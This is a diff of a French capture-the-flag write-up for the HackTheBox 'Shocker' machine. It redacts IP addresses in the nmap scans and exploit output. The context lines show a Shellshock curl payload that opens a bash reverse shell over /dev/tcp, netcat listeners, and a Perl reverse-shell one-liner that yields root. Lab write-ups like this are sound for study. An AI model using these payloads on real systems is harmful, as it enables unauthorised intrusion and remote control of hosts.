@@ -40,7 +40,7 @@ ctf:
   target_ip: "10.129.x.x"
   skills: ["Enumeration","Web","Privilege Escalation"]
   time_spent: "4h"
-  # vpn_ip: "10.10.14.xx"
+  # vpn_ip: "10.10.x.x"
   # notes: "Points d'attention…"
 
 # --- Options diverses ---
@@ -123,7 +123,7 @@ Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) te révèle les por
 
 ```txt
 # Nmap 7.95 scan initiated Fri Nov 21 16:15:03 2025 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt shocker.htb
-Nmap scan report for shocker.htb (10.129.160.126)
+Nmap scan report for shocker.htb (10.129.x.x)
 Host is up (0.0069s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT     STATE SERVICE
@@ -145,7 +145,7 @@ Voici le résultat (`scans_nmap/aggressive_vuln_scan.txt`) :
     nmap -Pn -A -sV -p"80,2222" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "shocker.htb"
 
 # Nmap 7.95 scan initiated Fri Nov 21 16:15:11 2025 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p80,2222 --script=http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt shocker.htb
-Nmap scan report for shocker.htb (10.129.160.126)
+Nmap scan report for shocker.htb (10.129.x.x)
 Host is up (0.0070s latency).
 
 PORT     STATE SERVICE VERSION
@@ -162,8 +162,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE (using port 2222/tcp)
 HOP RTT     ADDRESS
-1   6.59 ms 10.10.14.xx
-2   6.86 ms shocker.htb (10.129.160.126)
+1   6.59 ms 10.10.x.x
+2   6.86 ms shocker.htb (10.129.x.x)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Nov 21 16:15:19 2025 -- 1 IP address (1 host up) scanned in 8.41 seconds
@@ -176,7 +176,7 @@ Résultats du scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).
 
 ```txt
 # Nmap 7.95 scan initiated Fri Nov 21 16:15:19 2025 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p80,2222 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt shocker.htb
-Nmap scan report for shocker.htb (10.129.160.126)
+Nmap scan report for shocker.htb (10.129.x.x)
 Host is up (0.0072s latency).
 
 PORT     STATE SERVICE VERSION
@@ -223,7 +223,7 @@ Résultats du scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`).
 
 ```txt
 # Nmap 7.95 scan initiated Fri Nov 21 16:15:37 2025 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt shocker.htb
-Nmap scan report for shocker.htb (10.129.160.126)
+Nmap scan report for shocker.htb (10.129.x.x)
 Host is up (0.0080s latency).
 
 PORT      STATE         SERVICE
@@ -377,7 +377,7 @@ Script       : mon-subdomains
 Version      : mon-subdomains 2.0.0
 Date         : 2026-01-09 18:45:57
 Domaine      : shocker.htb
-IP           : 10.129.35.201
+IP           : 10.129.x.x
 Mode         : large
 Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
 Codes        : 200,301,302,401,403  (strict=1)
@@ -540,7 +540,7 @@ La vulnérabilité étant désormais confirmée, tu injectes un **payload Bash d
 Ce payload est exécuté via **Shellshock** par le script CGI et t’ouvre immédiatement une session distante vers ta machine Kali Linux, te fournissant ainsi un premier shell interactif sur la cible.
 
 ```bash
-curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.xx/4444 0>&1"' http://shocker.htb/cgi-bin/user.sh
+curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"' http://shocker.htb/cgi-bin/user.sh
 
 ```
 > **Note :**
@@ -557,7 +557,7 @@ Dans un autre terminal sur Kali Linux :
 ```bash
 nc -lvnp 4444                                                       
 Listening on 0.0.0.0 4444
-Connection received on 10.129.160.126 58744
+Connection received on 10.129.x.x 58744
 bash: no job control in this shell
 shelly@Shocker:/usr/lib/cgi-bin$
 ```
@@ -638,7 +638,7 @@ shelly@Shocker:/home/shelly$ perl -e 'use Socket;$i="10.10.x.x";$p=12345;socket(
 ```bash
 nc -lvnp 12345                                                      
 Listening on 0.0.0.0 12345
-Connection received on 10.129.160.126 34840
+Connection received on 10.129.x.x 34840
 root@Shocker:/home/shelly# 
 ```
 
